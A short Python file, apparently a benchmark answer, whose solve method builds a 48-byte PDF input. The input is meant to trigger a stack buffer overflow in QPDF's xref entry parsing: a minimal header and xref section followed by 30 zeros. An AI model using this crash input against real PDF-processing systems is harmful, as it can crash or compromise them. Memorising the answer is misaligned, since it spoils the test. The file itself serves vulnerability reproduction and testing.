import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        The vulnerability is a stack buffer overflow in QPDF::read_xrefEntry caused by
        missing validation for the first end-of-line character when reading xref entries.
        An overlong f1 entry consisting only of zeros triggers this.
        
        Ground-truth length is 48 bytes.
        Structure:
        - %PDF-1.0\n  (9 bytes)
        - xref\n      (5 bytes)
        - 0 1\n       (4 bytes)
        - 0...0       (30 bytes)
        Total: 48 bytes
        """
        header = b"%PDF-1.0\n"
        xref_marker = b"xref\n"
        subsection = b"0 1\n"
        # 30 zeros to overflow the stack buffer allocated for the entry field
        payload = b"0" * 30
        
        return header + xref_marker + subsection + payload